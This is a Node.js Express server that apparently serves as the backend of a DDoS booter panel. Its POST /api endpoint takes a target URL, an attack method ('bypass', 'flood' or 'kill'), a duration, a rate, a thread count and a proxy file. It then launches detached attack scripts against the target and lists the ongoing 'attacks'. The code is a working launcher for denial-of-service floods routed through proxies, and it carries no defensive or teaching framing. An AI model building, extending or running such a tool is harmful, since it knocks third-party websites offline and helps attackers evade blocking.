const express = require('express');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const app = express();
app.use(express.json());
const logFile = path.join(__dirname, 'data', 'requests.log');
const ongoingAttacks = [];
if (!fs.existsSync(path.dirname(logFile))) {
    fs.mkdirSync(path.dirname(logFile), { recursive: true });
}
app.get('/api', (req, res) => {
    const currentTime = Date.now();
    const ip = req.ip;
    const logEntry = `${currentTime},${ip}\n`;
    fs.appendFileSync(logFile, logEntry, { flag: 'a' });
    res.json(getRequestsPerSecond());
});
app.get('/api/ongoing', (req, res) => {
    res.json(ongoingAttacks);
});
app.post('/api', (req, res) => {
    const { method = 'kill', target, time = 260, rate = 30, threads = 10, proxyfile = 'prx.txt' } = req.body;
    if (!target) {
        return res.status(400).json({ message: 'Target URL is required' });
    }
    if (!['bypass', 'flood', 'kill'].includes(method)) {
        return res.status(400).json({ message: 'Invalid method. Must be bypass, flood, or kill' });
    }
    const scriptPath = path.join(__dirname, `${method}.js`);
    if (!fs.existsSync(scriptPath)) {
        return res.status(400).json({ message: `Script ${method}.js not found` });
    }
    const attack = spawn('node', [scriptPath, target, time, rate, threads, proxyfile], { detached: true, stdio: 'ignore' });
    ongoingAttacks.push({ method, target, time, rate, threads, proxyfile, pid: attack.pid });
    attack.on('close', () => {
        const index = ongoingAttacks.findIndex(a => a.pid === attack.pid);
        if (index !== -1) ongoingAttacks.splice(index, 1);
    });
    attack.unref();
    res.json({ message: `Attack started with ${method}.js` });
});
function getRequestsPerSecond() {
    if (!fs.existsSync(logFile)) {
        return [Date.now(), 0];
    }
    const lines = fs.readFileSync(logFile, 'utf8').split('\n').filter(line => line.trim());
    const currentTime = Date.now();
    const recentRequests = lines.filter(line => {
        const timestamp = parseInt(line.split(',')[0]);
        return (currentTime - timestamp) <= 1000;
    });
    return [currentTime, recentRequests.length];
}
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`API running on port ${port}`));
